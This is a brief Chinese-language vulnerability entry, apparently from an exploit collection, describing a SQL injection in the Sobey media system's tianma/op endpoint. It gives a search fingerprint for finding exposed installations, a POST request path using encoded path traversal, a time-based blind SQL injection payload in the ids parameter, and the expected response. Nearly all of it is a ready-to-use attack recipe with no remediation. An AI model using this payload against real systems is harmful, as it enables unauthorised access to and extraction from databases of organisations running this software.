# 索贝融媒体系统tianma_op存在SQL注入漏洞

索贝融媒体系统 ｜ SQL注入 ｜ —
- **指纹**：`app="SOBEY-融媒体"`
- **请求**：`POST /sobey-mchEditor/js/%2e%2e/tianma/op HTTP/1.1`

**Payload**
```
opstatus=up&siteCode=1&token=1&ids=1') OR (SELECT * FROM (SELECT(SLEEP(5)))x)--+x
```
- **响应特征**：200